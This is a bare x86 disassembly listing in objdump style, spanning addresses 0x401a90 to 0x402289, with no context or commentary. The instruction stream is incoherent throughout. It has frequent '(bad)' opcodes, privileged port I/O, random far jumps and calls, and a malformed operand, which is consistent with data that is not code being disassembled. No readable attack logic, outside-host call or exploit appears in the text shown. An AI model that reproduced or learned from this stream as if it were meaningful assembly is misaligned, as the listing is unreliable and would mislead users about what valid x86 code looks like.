  401a90:	mov    ebx,0xbe2f7399
  401a95:	or     DWORD PTR [edx-0x2dda3e9f],esp
  401a9b:	sar    DWORD PTR [esi-0x13c920f9],0x62
  401aa2:	ror    BYTE PTR [ebx],cl
  401aa4:	push   es
  401aa5:	sbb    DWORD PTR [esi],esi
  401aa7:	pop    eax
  401aa8:	cmp    BYTE PTR [esi],al
  401aaa:	jge    0x401a6d
  401aac:	sub    dh,0x75
  401aaf:	adc    edx,DWORD PTR [eax-0x4fe6bd00]
  401ab5:	imul   BYTE PTR [esi+0x51108bb2]
  401abb:	sbb    al,al
  401abd:	xchg   ebx,eax
  401abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401abf:	xchg   esp,eax
  401ac0:	adc    edx,DWORD PTR [edi-0x2b0a7b8a]
  401ac6:	sti    
  401ac7:	jae    0x401aea
  401ac9:	rol    DWORD PTR [ebx+0x61adc888],1
  401acf:	sbb    ah,dl
  401ad1:	data16 aam 0xc3
  401ad4:	inc    esi
  401ad5:	mov    edx,0x31a17704
  401ada:	bts    DWORD PTR [ecx-0x23],ebp
  401ade:	sub    al,0x2a
  401ae0:	or     al,0xae
  401ae2:	jne    0x401b4a
  401ae4:	pusha  
  401ae5:	and    dh,BYTE PTR [edx-0x39aaac1d]
  401aeb:	pop    ebx
  401aec:	test   al,0x33
  401aee:	enter  0x8878,0x63
  401af2:	sbb    ch,dh
  401af4:	out    0x99,eax
  401af6:	adc    esi,DWORD PTR [esp+ebp*4]
  401af9:	cmp    al,0x3f
  401afb:	stos   DWORD PTR es:[edi],eax
  401afc:	lahf   
  401afd:	je     0x401b51
  401aff:	jl     0x401b46
  401b01:	xchg   ebx,eax
  401b02:	out    dx,al
  401b03:	stc    
  401b04:	sbb    BYTE PTR [esp+eiz*8],0xe1
  401b08:	icebp  
  401b09:	add    edi,eax
  401b0b:	ja     0x401abb
  401b0d:	jnp    0x401ad3
  401b0f:	sub    BYTE PTR [ecx+0x7b7830e3],ah
  401b15:	retf   0x659d
  401b18:	cmp    ch,BYTE PTR [eax]
  401b1a:	dec    edx
  401b1b:	fs daa 
  401b1d:	fiadd  DWORD PTR [esi-0x17]
  401b20:	repnz fist WORD PTR [ebp-0xad3518d]
  401b27:	sbb    cl,cl
  401b29:	jl     0x401b5a
  401b2b:	jl     0x401b84
  401b2d:	inc    ecx
  401b2e:	imul   edx,DWORD PTR [eax+0x266afbe2],0xa9d27bb4
  401b38:	dec    edi
  401b39:	daa    
  401b3a:	mov    esi,0x7f22c445
  401b3f:	(bad)  
  401b41:	ret    
  401b42:	fdivr  DWORD PTR [eax]
  401b44:	pusha  
  401b45:	jle    0x401b3b
  401b47:	ss aas 
  401b49:	mov    WORD PTR [edi+edx*4],ds
  401b4c:	sub    DWORD PTR [edi+0x41],esi
  401b4f:	jl     0x401b7c
  401b51:	pop    ebx
  401b52:	nop
  401b53:	cmp    BYTE PTR [eax-0x28],dl
  401b56:	dec    ebp
  401b57:	mov    ch,0xfd
  401b59:	mov    esp,0x3f116721
  401b5e:	shl    bl,1
  401b60:	cmc    
  401b61:	xor    eax,0x759922d
  401b66:	xchg   edx,eax
  401b67:	xchg   edi,eax
  401b68:	adc    eax,0x1ea6dc7f
  401b6d:	jl     0x401b9b
  401b6f:	repz sub DWORD PTR [ebp-0x70],0xffffffd0
  401b74:	pop    eax
  401b75:	or     BYTE PTR [ebx],0x4d
  401b78:	(bad)  
  401b79:	iret   
  401b7a:	enterw 0x23e6,0xe2
  401b7f:	mov    ebp,0xb10fd311
  401b84:	mov    ds:0xa1638246,eax
  401b89:	sar    al,cl
  401b8b:	or     BYTE PTR [eax+0x2e],dh
  401b8e:	push   ebx
  401b8f:	popa   
  401b90:	mov    bh,0x7a
  401b92:	mov    edi,0x53c310e9
  401b97:	je     0x401b4a
  401b99:	mov    al,0xba
  401b9b:	(bad)  
  401b9c:	xchg   ecx,eax
  401b9d:	gs dec edi
  401b9f:	sbb    eax,0x975db6e2
  401ba4:	push   edi
  401ba5:	adc    bl,BYTE PTR [ebp-0x236dcdeb]
  401bab:	fwait
  401bac:	jae    0x401b68
  401bae:	jno    0x401bef
  401bb0:	in     al,dx
  401bb1:	loopne 0x401bad
  401bb3:	je     0x401bf9
  401bb5:	sti    
  401bb6:	je     0x401bee
  401bb8:	shl    al,1
  401bba:	shl    BYTE PTR [esi-0x469a97d6],1
  401bc0:	lods   al,BYTE PTR ds:[esi]
  401bc1:	mov    ebx,0xceb923ec
  401bc6:	jmp    DWORD PTR [edx+edx*8+0x1269695]
  401bcd:	les    ebx,FWORD PTR [ecx+0x5]
  401bd0:	and    eax,0xdff7dbc8
  401bd5:	nop
  401bd6:	mov    bh,0x46
  401bd8:	out    dx,eax
  401bd9:	sbb    eax,0xa018433a
  401bde:	cld    
  401bdf:	push   0xffffffdb
  401be1:	or     BYTE PTR [ebx+0x4f05d9d7],dl
  401be7:	mov    BYTE PTR [ebx],al
  401be9:	fwait
  401bea:	stos   BYTE PTR es:[edi],al
  401beb:	adc    BYTE PTR [edx],ch
  401bed:	in     al,dx
  401bee:	(bad)  
  401bef:	out    0xa5,eax
  401bf1:	arpl   WORD PTR [ebx+0x30d7d5cd],cx
  401bf7:	jecxz  0x401c34
  401bf9:	lods   al,BYTE PTR ds:[esi]
  401bfa:	dec    eax
  401bfb:	mov    dl,0xa5
  401bfd:	mov    esp,0x765d5a5a
  401c02:	(bad)  
  401c04:	mov    ds:0x46459ce3,al
  401c09:	adc    eax,DWORD PTR [eax+edi*8]
  401c0c:	mov    al,0x79
  401c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c0f:	xchg   edi,eax
  401c10:	js     0x401c7f
  401c12:	mov    bl,0x89
  401c14:	aas    
  401c15:	add    eax,0x490e1588
  401c1a:	mov    eax,0x2037bb40
  401c1f:	jo     0x401bb3
  401c21:	or     eax,0x9ef9145
  401c26:	jg     0x401bae
  401c28:	fld    QWORD PTR [esi+0x2b]
  401c2b:	push   ecx
  401c2c:	pop    ss
  401c2d:	leave  
  401c2e:	inc    edx
  401c2f:	fcomp  QWORD PTR [eax+esi*2-0x2a]
  401c33:	loop   0x401c2e
  401c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c36:	lea    ecx,ds:[eax]
  401c39:	xchg   edx,eax
  401c3a:	sbb    esi,DWORD PTR [ebp+0x49]
  401c3d:	out    0x9a,al
  401c3f:	sub    edi,DWORD PTR [esi+0x37]
  401c42:	mov    eax,ds:0x7ed8a273
  401c47:	jne    0x401c42
  401c49:	out    0x49,al
  401c4b:	pop    ebp
  401c4c:	mov    bl,BYTE PTR [eax-0x7067dead]
  401c52:	xor    DWORD PTR [eax+0xd],ebp
  401c55:	push   edi
  401c56:	stc    
  401c57:	push   0x6a
  401c59:	and    cl,dl
  401c5b:	sbb    eax,0x40ee504a
  401c60:	push   eax
  401c61:	dec    BYTE PTR ds:0xecc83f95
  401c67:	(bad)  
  401c68:	std    
  401c69:	sbb    al,BYTE PTR [ebx-0x3fcfbb86]
  401c6f:	sti    
  401c70:	aad    0x9c
  401c72:	cmp    al,0x5a
  401c74:	xor    edx,eax
  401c76:	sahf   
  401c77:	mov    al,ds:0x68736710
  401c7c:	fsub   DWORD PTR [edx+0x23e3516e]
  401c82:	(bad)  
  401c83:	xchg   edi,eax
  401c84:	mov    DWORD PTR [edx+0xbdceac],ebp
  401c8a:	xchg   esp,eax
  401c8b:	gs cwde 
  401c8d:	push   ebp
  401c8e:	jecxz  0x401c77
  401c90:	std    
  401c91:	mov    ebp,0x6b614bf4
  401c96:	or     DWORD PTR [ebx+0x4fac53b8],ebp
  401c9c:	dec    ebp
  401c9d:	pop    esp
  401c9e:	inc    ebp
  401c9f:	and    BYTE PTR [ecx+edi*4],bh
  401ca2:	mov    dl,0x66
  401ca4:	jae    0x401c47
  401ca6:	cmp    esp,esi
  401ca8:	pop    edi
  401ca9:	sbb    esi,DWORD PTR [eax+0x6d]
  401cac:	push   ebp
  401cad:	(bad)  
  401cae:	(bad)  
  401caf:	aaa    
  401cb0:	ficomp WORD PTR [ecx-0x4d583765]
  401cb6:	and    ch,BYTE PTR [ebx+0x12]
  401cb9:	jbe    0x401cce
  401cbb:	pop    ebx
  401cbc:	or     ch,BYTE PTR [ebp+0x13]
  401cbf:	inc    eax
  401cc0:	dec    edi
  401cc1:	sbb    edx,ebp
  401cc3:	push   0xffffffc1
  401cc5:	inc    edi
  401cc6:	pop    esi
  401cc7:	jge    0x401cac
  401cc9:	cmp    DWORD PTR [esi+esi*1+0x3893cde4],ebp
  401cd0:	dec    esi
  401cd1:	and    DWORD PTR [edx+0x3cee6335],edi
  401cd7:	cmp    eax,0x4d6db364
  401cdc:	xchg   ecx,eax
  401cdd:	xchg   BYTE PTR [eax+0x1d5d2231],dh
  401ce3:	add    ecx,ecx
  401ce5:	iret   
  401ce6:	or     eax,0x9abb9945
  401ceb:	sbb    ch,BYTE PTR [edx+eax*1+0x35fdac69]
  401cf2:	hlt    
  401cf3:	adc    ecx,DWORD PTR ds:0xbe96d27a
  401cf9:	ret    0xb847
  401cfc:	or     eax,0x75313fa8
  401d01:	or     eax,0xe353553a
  401d06:	lock sub BYTE PTR ss:[esi-0x19],0xb0
  401d0c:	xor    al,0x87
  401d0e:	loopne 0x401d13
  401d10:	inc    BYTE PTR [ebp-0x39]
  401d13:	push   ds
  401d14:	pushf  
  401d15:	ret    0xd85f
  401d18:	mov    cs,WORD PTR [edi+0x2a]
  401d1b:	cld    
  401d1c:	or     al,BYTE PTR [eax+0x1c856c08]
  401d22:	imul   ebp,ebx,0xfe9531bc
  401d28:	stc    
  401d29:	pop    es
  401d2a:	outs   dx,BYTE PTR ds:[esi]
  401d2b:	and    eax,0x533140c2
  401d30:	pop    ecx
  401d31:	dec    ebx
  401d32:	mov    ecx,0x8ed4a60d
  401d37:	popf   
  401d38:	mov    edi,DWORD PTR [edx+0x69]
  401d3b:	mov    es,WORD PTR [esi]
  401d3d:	mov    eax,0xbd4bf756
  401d42:	mov    DWORD PTR [ecx+ebx*2-0x3b710f03],esp
  401d49:	js     0x401cd1
  401d4b:	add    cl,BYTE PTR [ecx+ecx*2]
  401d4e:	loop   0x401cd0
  401d50:	ins    BYTE PTR es:[edi],dx
  401d51:	add    eax,0x9c57a921
  401d56:	dec    ebp
  401d57:	pop    esp
  401d58:	lods   eax,DWORD PTR fs:[esi]
  401d5a:	jo     0x401cdc
  401d5c:	aam    0x69
  401d5e:	jne    0x401d13
  401d60:	jmp    0x401dbc
  401d62:	pop    edi
  401d63:	iret   
  401d64:	pop    edi
  401d65:	inc    edx
  401d66:	sahf   
  401d67:	test   BYTE PTR [esi+ebx*2-0x6503fba],0x69
  401d6f:	fidivr DWORD PTR [edx-0x4d94899f]
  401d75:	ss loop 0x401dc2
  401d78:	neg    BYTE PTR [esi+0x19]
  401d7b:	mov    ds:0xaca07b55,al
  401d80:	jmp    0x544:0xfb144e3a
  401d87:	inc    esp
  401d88:	and    al,0xe8
  401d8a:	call   0x8e558d99
  401d8f:	cmp    DWORD PTR [edx+edi*2-0x3848bb81],0xb23a2338
  401d9a:	push   ebx
  401d9b:	jb     0x401d79
  401d9d:	in     eax,dx
  401d9e:	dec    esp
  401d9f:	push   ecx
  401da0:	leave  
  401da1:	pop    es
  401da2:	jp     0x401d8c
  401da4:	retf   0x20a
  401da7:	xchg   DWORD PTR [ebx+eiz*1],edi
  401daa:	into   
  401dab:	jge    0x401d73
  401dad:	jo     0x401d37
  401daf:	test   BYTE PTR [ebx],dh
  401db1:	cdq    
  401db2:	(bad)  
  401db3:	mov    al,0x20
  401db5:	mov    ds:0xa8e6317b,al
  401dba:	clc    
  401dbb:	sub    edx,DWORD PTR [eiz*1+0x644a90db]
  401dc2:	rcr    al,0xfb
  401dc5:	jo     0x401dcb
  401dc7:	lods   eax,DWORD PTR ds:[esi]
  401dc8:	or     DWORD PTR [edx+ecx*8-0x3f],ecx
  401dcc:	fdivr  QWORD PTR [edi-0x59]
  401dcf:	mov    edi,0x4984533d
  401dd4:	in     eax,0xf6
  401dd6:	pop    ds
  401dd7:	ins    DWORD PTR es:[edi],dx
  401dd8:	aas    
  401dd9:	mov    ds:0x762c8c80,eax
  401dde:	cmp    bh,BYTE PTR [edi]
  401de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401de1:	jno    0x401dbb
  401de3:	loope  0x401e62
  401de5:	ds jle 0x401e56
  401de8:	outs   dx,BYTE PTR ds:[esi]
  401de9:	or     esi,DWORD PTR [edx-0x28]
  401dec:	pop    ss
  401ded:	clc    
  401dee:	es aaa 
  401df0:	(bad)  
  401df1:	xchg   edi,eax
  401df2:	mov    ecx,0x859d52b9
  401df7:	stos   DWORD PTR es:[edi],eax
  401df8:	or     bl,ah
  401dfa:	pop    es
  401dfb:	sahf   
  401dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dfd:	jns    0x401df3
  401dff:	and    cl,dl
  401e01:	cmc    
  401e02:	int    0x19
  401e04:	cmp    al,0x2b
  401e06:	sbb    eax,0x9ccbdf76
  401e0b:	push   ebp
  401e0c:	inc    ebp
  401e0d:	mov    bh,0x1b
  401e0f:	add    edi,eax
  401e11:	sbb    BYTE PTR ds:0x8397a465,ah
  401e17:	dec    ecx
  401e18:	jb     0x401e93
  401e1a:	mov    WORD PTR [ecx-0x41],ds
  401e1d:	pop    ss
  401e1e:	add    edx,DWORD PTR [ecx]
  401e20:	das    
  401e21:	add    DWORD PTR [ecx-0x2b8a733a],0xd6b0e263
  401e2b:	xchg   edi,eax
  401e2c:	daa    
  401e2d:	arpl   bp,cx
  401e2f:	push   eax
  401e30:	clc    
  401e31:	fld    DWORD PTR [edi]
  401e33:	adc    BYTE PTR [ebx+0x712682dc],cl
  401e39:	mov    esi,0xc8a278a
  401e3e:	xchg   ecx,eax
  401e3f:	sbb    DWORD PTR [esp+edi*1+0x20a6b254],eax
  401e46:	cmp    eax,0xc331bff6
  401e4b:	inc    eax
  401e4d:	cld    
  401e4e:	jl     0x401eaf
  401e50:	call   0x1d69:0x1b444bb0
  401e57:	push   esp
  401e58:	jecxz  0x401e63
  401e5a:	or     BYTE PTR [ebx],ah
  401e5c:	fs xchg ebx,eax
  401e5e:	push   eax
  401e5f:	sbb    edi,eax
  401e61:	mov    BYTE PTR [eax],ah
  401e63:	xchg   ebp,eax
  401e64:	ror    DWORD PTR [esi-0x48],1
  401e67:	dec    eax
  401e68:	jne    0x401e63
  401e6a:	ss js  0x401e11
  401e6d:	or     eax,ebx
  401e6f:	push   0x6b
  401e71:	xchg   cl,dl
  401e73:	scas   eax,DWORD PTR es:[edi]
  401e74:	pop    edi
  401e75:	les    edi,FWORD PTR [esi-0x21]
  401e78:	mov    ds:0xa6a74efc,al
  401e7d:	or     ch,ch
  401e7f:	sub    edi,esp
  401e81:	aad    0x6b
  401e83:	jmp    0x2c31:0x782404b0
  401e8a:	xchg   esi,eax
  401e8b:	or     eax,0xf0e39497
  401e90:	addr16 xor eax,0x2dd7762a
  401e96:	cld    
  401e97:	cmp    al,0x0
  401e99:	sbb    DWORD PTR [ebp-0x54173ed0],ebp
  401e9f:	or     al,0xa5
  401ea1:	jo     0x401e97
  401ea3:	imul   esp,DWORD PTR es:[ebp+0x46fa2238],0x3c
  401eab:	sti    
  401eac:	cmp    al,BYTE PTR [edi]
  401eae:	mov    al,ds:0xc27b76e4
  401eb3:	std    
  401eb4:	xor    DWORD PTR [esi+0x21],0x6f
  401eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eb9:	in     al,0x5e
  401ebb:	sub    eax,0x4a839b64
  401ec0:	imul   ecx,DWORD PTR [esi],0x2d50f82f
  401ec6:	test   bh,ch
  401ec8:	int    0x74
  401eca:	fwait
  401ecb:	and    al,0x6b
  401ecd:	pop    ss
  401ece:	mov    dl,0x2e
  401ed0:	mov    cl,0xc2
  401ed2:	push   eax
  401ed3:	sbb    DWORD PTR ds:0xa893cb90,edi
  401ed9:	push   ds
  401eda:	inc    eax
  401edb:	mov    ds:0x8b78bd75,al
  401ee0:	popf   
  401ee1:	or     eax,0xb7ff19d
  401ee6:	mov    eax,0x4aae9de5
  401eeb:	call   0xe1b8:0xf2a79fd
  401ef2:	mov    DWORD PTR [eax+0xa861938],edi
  401ef8:	sub    ebx,DWORD PTR [ebp+0x4798ce14]
  401efe:	cmp    eax,0x7782e8f9
  401f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f04:	push   es
  401f05:	fcomip st,st(2)
  401f07:	and    eax,0x9bb17d6f
  401f0c:	inc    esi
  401f0d:	sub    eax,0x5e4e6a19
  401f12:	out    dx,al
  401f13:	xchg   edi,eax
  401f14:	push   ds
  401f15:	idiv   DWORD PTR ds:0xb680ec68
  401f1b:	cmovl  edi,DWORD PTR [edi]
  401f1e:	daa    
  401f1f:	adc    ch,BYTE PTR [edx]
  401f21:	dec    eax
  401f22:	int    0xab
  401f24:	xor    al,0x18
  401f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f27:	jmp    0x24882826
  401f2c:	cmc    
  401f2d:	cmp    BYTE PTR [ecx-0xb],0x65
  401f31:	daa    
  401f32:	mov    esi,0xbddfc96b
  401f37:	jle    0x401f2b
  401f39:	dec    eax
  401f3a:	call   0xe8212df5
  401f3f:	stc    
  401f40:	inc    edi
  401f41:	xor    DWORD PTR [eax-0x3d],esp
  401f44:	enter  0x9200,0x89
  401f48:	ret    0x7cdd
  401f4b:	sbb    al,0xac
  401f4d:	dec    esp
  401f4e:	cmc    
  401f4f:	leave  
  401f50:	pop    ebp
  401f51:	cmp    ecx,DWORD PTR [esi]
  401f53:	adc    eax,0x6e0c06c8
  401f58:	ret    0x321e
  401f5b:	jo     0x401f19
  401f5d:	cmp    ecx,DWORD PTR [eax]
  401f5f:	and    DWORD PTR [ebx-0x62],edx
  401f62:	and    BYTE PTR [ebx-0x39],dl
  401f65:	mov    bl,0x1c
  401f67:	xchg   ebp,eax
  401f68:	sahf   
  401f69:	(bad)
  401f6d:	mov    al,0x24
  401f6f:	jle    0x401fac
  401f71:	and    al,dh
  401f73:	pop    ebx
  401f74:	push   es
  401f75:	bound  ecx,QWORD PTR [esi]
  401f77:	lea    ebp,[esi-0xc857c42]
  401f7d:	cwde   
  401f7e:	and    al,0x9c
  401f80:	lahf   
  401f81:	mul    BYTE PTR [edx-0x36]
  401f84:	fsub   st(3),st
  401f86:	and    al,0xfd
  401f88:	not    DWORD PTR [eax+edi*4-0x22f8b436]
  401f8f:	clc    
  401f90:	pop    ds
  401f91:	push   ecx
  401f92:	inc    ebp
  401f93:	ficomp DWORD PTR [ebx+ebp*2-0x47]
  401f97:	mov    al,0x61
  401f99:	lock mov esp,0x541936cf
  401f9f:	shl    BYTE PTR [edi+0x11],0x57
  401fa3:	call   0x1c8208d3
  401fa8:	push   eax
  401fa9:	mov    fs,WORD PTR [ecx+0x4e82f9]
  401faf:	int    0xc0
  401fb1:	call   0x3ad499
  401fb6:	mov    ebx,0x86c4e0f3
  401fbb:	dec    ebx
  401fbc:	inc    ebx
  401fbd:	or     dh,al
  401fbf:	jo     0x401fa6
  401fc1:	inc    edx
  401fc2:	dec    eax
  401fc3:	(bad)  
  401fc4:	pop    edi
  401fc5:	data16 addr16 cmp cl,0x55
  401fca:	shl    DWORD PTR [eax+0x25],1
  401fcd:	(bad)  
  401fce:	ins    BYTE PTR es:[edi],dx
  401fcf:	rol    ebp,1
  401fd1:	sbb    eax,0xeb36f48
  401fd6:	addr16 adc eax,0xdbb8bb7b
  401fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fdd:	mov    dl,0x56
  401fdf:	popf   
  401fe0:	fs test eax,0x5760d7b9
  401fe6:	adc    eax,0x6ba2d1a7
  401feb:	repz xor DWORD PTR [eax+0x4],0xfffffffa
  401ff0:	adc    BYTE PTR [ebp+0x19],cl
  401ff3:	hlt    
  401ff4:	retf   
  401ff5:	push   ebp
  401ff6:	cmp    ebx,DWORD PTR [edx+0x4aed7011]
  401ffc:	jmp    0x402046
  401ffe:	in     al,dx
  401fff:	test   dh,al
  402001:	ins    BYTE PTR es:[edi],dx
  402002:	push   esi
  402003:	dec    ebx
  402004:	jbe    0x401fe9
  402006:	mov    ecx,0x7371f5a3
  40200b:	sub    dh,cl
  40200d:	push   ds
  40200e:	and    eax,0xbce4fb2b
  402013:	shl    DWORD PTR [ebp+0xdea378],0x42
  40201a:	dec    eax
  40201b:	or     BYTE PTR [eax],0x1a
  40201e:	inc    ebx
  40201f:	cdq    
  402020:	sbb    DWORD PTR [edx+0x15],ebp
  402023:	pushf  
  402024:	push   ecx
  402025:	mov    BYTE PTR [ebp+ebp*1+0x41deae67],0x7
  40202d:	push   ds
  40202e:	add    al,0xfb
  402030:	adc    ch,0x27
  402033:	sub    DWORD PTR ds:0x5d10303e,ecx
  402039:	dec    ecx
  40203a:	inc    esp
  40203b:	test   DWORD PTR [edx-0xa],edx
  40203e:	xor    BYTE PTR [ebx+0x59095e5b],dh
  402044:	out    dx,eax
  402045:	xchg   ecx,eax
  402046:	mov    ah,bl
  402048:	jno    0x40208d
  40204a:	std    
  40204b:	push   eax
  40204c:	fsubp  st(5),st
  40204e:	inc    edx
  40204f:	or     DWORD PTR [ebx],edi
  402051:	imul   esi,DWORD PTR [ecx+esi*2],0x744b5477
  402058:	lds    ecx,FWORD PTR [eax-0x2]
  40205b:	fwait
  40205c:	xchg   ebp,eax
  40205d:	idiv   DWORD PTR [edi-0x7e2a78a7]
  402063:	mov    al,0xd1
  402065:	scas   eax,DWORD PTR es:[edi]
  402066:	jle    0x402046
  402068:	shr    BYTE PTR [edx],1
  40206a:	mov    ah,0x94
  40206c:	jns    0x401ff0
  40206e:	das    
  40206f:	xor    eax,0x60869e08
  402074:	adc    eax,0x8985572c
  402079:	jle    0x4020cb
  40207b:	mov    dl,0xdf
  40207d:	mov    bh,0x6b
  40207f:	sbb    BYTE PTR [ebx],dl
  402081:	cmp    eax,0xee508f7
  402086:	inc    edi
  402087:	jg     0x4020e8
  402089:	dec    esi
  40208a:	or     edx,0xffffff80
  40208d:	cmp    ecx,DWORD PTR ds:0x2004415a
  402093:	cs ja  0x402087
  402096:	scas   eax,DWORD PTR es:[edi]
  402097:	dec    esi
  402098:	es popa 
  40209a:	mov    edx,0xd0c1968d
  40209f:	(bad)  
  4020a0:	shl    BYTE PTR [edx],cl
  4020a2:	or     ebp,ebp
  4020a4:	ins    BYTE PTR es:[edi],dx
  4020a5:	aaa    
  4020a6:	mov    cl,0x25
  4020a8:	ja     0x402114
  4020aa:	mov    ds:0x22e24a2f,al
  4020af:	jno    0x40209b
  4020b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020b2:	sub    BYTE PTR [ebx],cl
  4020b4:	in     al,0xaa
  4020b6:	rcl    BYTE PTR [esi+0x24],cl
  4020b9:	adc    dl,cl
  4020bb:	cmc    
  4020bc:	or     ecx,esi
  4020be:	push   ss
  4020bf:	push   ss
  4020c0:	xchg   BYTE PTR [ebx],dh
  4020c2:	(bad)  
  4020c3:	fcomp  DWORD PTR [edx-0x2ad8d7c7]
  4020c9:	aam    0x87
  4020cb:	repnz xor BYTE PTR ds:0x47196533,ah
  4020d2:	jo     0x402107
  4020d4:	enter  0x5698,0x77
  4020d8:	push   cs
  4020d9:	or     eax,0x5d8e42c7
  4020de:	xlat   BYTE PTR ds:[ebx]
  4020df:	inc    edi
  4020e0:	jnp    0x4020d4
  4020e2:	jl     0x4020dd
  4020e4:	hlt    
  4020e5:	out    dx,eax
  4020e6:	outs   dx,BYTE PTR ds:[esi]
  4020e7:	rol    DWORD PTR [ebp+0x7a],1
  4020ea:	inc    esi
  4020eb:	cwde   
  4020ec:	loopne 0x4020cd
  4020ee:	xchg   edi,eax
  4020ef:	sub    bh,ah
  4020f1:	retf   0x3679
  4020f4:	jo     0x4020c4
  4020f6:	cmp    eax,0xaa97ff5e
  4020fb:	inc    ebx
  4020fc:	add    cl,BYTE PTR [eax+0x5a9af246]
  402102:	pop    esi
  402103:	jg     0x4020b0
  402105:	sub    DWORD PTR [esi-0x62],edx
  402108:	push   edx
  402109:	sar    BYTE PTR [esi],0x69
  40210c:	add    DWORD PTR ds:0x742695bb,ecx
  402112:	dec    ebx
  402113:	test   DWORD PTR [edi-0x76744ec0],0x19475359
  40211d:	shl    DWORD PTR [edi+0x1d002e0a],cl
  402123:	and    al,0x99
  402125:	enter  0x8cab,0x6b
  402129:	popw   ss
  40212b:	ja     0x402102
  40212d:	sbb    DWORD PTR ds:0x9ba559a3,edx
  402133:	cs test eax,0xcbd9f815
  402139:	scas   al,BYTE PTR es:[edi]
  40213a:	ret    0xdf45
  40213d:	es jns 0x4021b3
  402140:	dec    ecx
  402141:	inc    edx
  402142:	mov    esi,ecx
  402144:	cmp    dl,0xfc
  402147:	sahf   
  402148:	jmp    0xfb5a:0xed867eeb
  40214f:	stos   BYTE PTR es:[edi],al
  402150:	sar    DWORD PTR ss:[edx-0x4a],1
  402154:	sub    al,0xd9
  402156:	cmp    BYTE PTR [ebp-0x64],dl
  402159:	out    0x86,al
  40215b:	sbb    BYTE PTR [ecx-0x25],dh
  40215e:	(bad)
  402162:	(bad)  
  402163:	xchg   ebp,eax
  402164:	ret    0xef68
  402167:	lods   eax,DWORD PTR ds:[esi]
  402168:	popf   
  402169:	sub    cl,BYTE PTR [edi-0x61]
  40216c:	les    ebp,FWORD PTR gs:[ecx]
  40216f:	int3   
  402170:	push   ss
  402171:	xor    DWORD PTR [ecx],ecx
  402173:	out    dx,al
  402174:	leave  
  402175:	jmp    0x4020fa
  402177:	ret    0xdd20
  40217a:	jno    0x4021a1
  40217c:	sub    al,bl
  40217e:	lods   eax,DWORD PTR ds:[esi]
  40217f:	or     eax,DWORD PTR [ebp-0x7f]
  402182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402183:	pop    eax
  402184:	xchg   ebx,eax
  402185:	loopne 0x4021af
  402187:	in     eax,0xe4
  402189:	mov    WORD PTR [esi-0x48140b1],?
  40218f:	lock pop esp
  402191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402192:	nop
  402193:	cmp    BYTE PTR [eax],bh
  402195:	cmp    DWORD PTR [ebx+0xd],ecx
  402198:	leave  
  402199:	sub    eax,0x78d97b8d
  40219e:	ds mov esp,0x29fe3411
  4021a4:	stos   BYTE PTR es:[edi],al
  4021a5:	mov    di,0xffc3
  4021a9:	jmp    0xc6844948
  4021ae:	sub    eax,0x86f63c74
  4021b3:	addr16 faddp st(2),st
  4021b6:	adc    eax,0x283d3f7c
  4021bb:	call   0x6f4a:0x158f40d0
  4021c2:	clc    
  4021c3:	ss pop eax
  4021c5:	mov    eax,0x45a3647a
  4021ca:	mov    ds:0xc2456d4b,eax
  4021cf:	out    0xb8,eax
  4021d1:	jl     0x4021c5
  4021d3:	aas    
  4021d4:	and    DWORD PTR ds:0xe3f1a065,eax
  4021da:	shr    DWORD PTR [ecx-0xc],cl
  4021dd:	nop
  4021de:	and    DWORD PTR [ecx+0x2e],edi
  4021e1:	stc    
  4021e2:	mov    ecx,0xdb30ddae
  4021e7:	(bad)  
  4021e8:	add    eax,DWORD PTR ds:0x5e58
  4021ed:	aam    0x45
  4021ef:	mov    al,ds:0x99c0e258
  4021f4:	mov    WORD PTR [ebx],fs
  4021f6:	rcr    dh,1
  4021f8:	jmp    0x29f0eb66
  4021fd:	pop    ecx
  4021fe:	mov    DWORD PTR [ecx+0x14d6a3ff],ecx
  402204:	jne    0x402230
  402206:	xchg   ebp,eax
  402207:	repz mov ebx,0xef46dfc8
  40220d:	adc    DWORD PTR [esi-0x52],0xffffff85
  402211:	sbb    bh,BYTE PTR ds:0xae824169
  402217:	arpl   WORD PTR [esi+eax*2],sp
  40221a:	inc    eax
  40221b:	pop    ebp
  40221c:	dec    ebx
  40221d:	xchg   ebp,eax
  40221e:	(bad)  
  40221f:	xlat   BYTE PTR ds:[ebx]
  402220:	pushf  
  402221:	pop    es
  402222:	test   BYTE PTR [edi],bl
  402224:	add    eax,0xd8693541
  402229:	adc    eax,0xa411bf32
  40222e:	lods   al,BYTE PTR ds:[esi]
  40222f:	or     bl,BYTE PTR [ebx+0x41]
  402232:	fwait
  402233:	int3   
  402234:	or     eax,0x6893c60d
  402239:	push   ds
  40223a:	bnd js 0x40226e
  40223d:	jmp    DWORD PTR [ebx]
  40223f:	jns    0x402245
  402241:	ss or  eax,0x5a64d655
  402247:	sti    
  402248:	and    BYTE PTR [ecx-0x79],dl
  40224b:	out    0xda,eax
  40224d:	sub    cl,BYTE PTR [eax+edi*1+0x51580764]
  402254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402255:	cmc    
  402256:	std    
  402257:	test   BYTE PTR [esi],dh
  402259:	sbb    DWORD PTR [esi+ebx*2+0x669155d9],esi
  402260:	jae    0x4022a4
  402262:	aaa    
  402263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402264:	iret   
  402265:	(bad)  
  402266:	fistp  WORD PTR [bx+0x5f]
  40226a:	xchg   edx,eax
  40226b:	dec    ebp
  40226c:	push   ss
  40226d:	hlt    
  40226e:	or     bh,BYTE PTR [edi+0x56be529b]
  402274:	xchg   ebp,eax
  402275:	cdq    
  402276:	lods   al,BYTE PTR ds:[esi]
  402277:	outs   dx,DWORD PTR ds:[esi]
  402278:	(bad)  
  402279:	in     al,0x17
  40227b:	call   0x544:0xefded73
  402282:	(bad)  
  402284:	dec    edx
  402285:	xchg   ebx,ecx
  402287:	xchg   esi,eax
  402288:	inc    edx
  402289:	pop    eax
